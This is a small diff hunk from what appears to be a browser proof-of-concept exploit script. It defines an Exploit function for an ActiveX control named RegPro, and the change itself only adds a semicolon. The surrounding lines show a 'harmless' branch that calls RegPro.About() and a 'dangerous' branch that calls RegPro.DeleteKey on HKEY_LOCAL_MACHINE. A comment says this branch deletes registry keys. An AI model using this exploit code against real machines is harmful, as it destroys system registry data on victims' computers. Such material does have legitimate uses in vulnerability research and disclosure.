@@ -55,7 +55,7 @@ function Exploit(type) {
                 case "harmless":
                 default:
                         RegPro.About(); // Simple Harmless POC
-                        break
+                        break;
                         
                 case "dangerous":
                         RegPro.DeleteKey(80000002, keyname); // 80000002 HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER  80000001h UNCOMMENTING THIS LIKE WILL DELETE REGISTRY KEYS
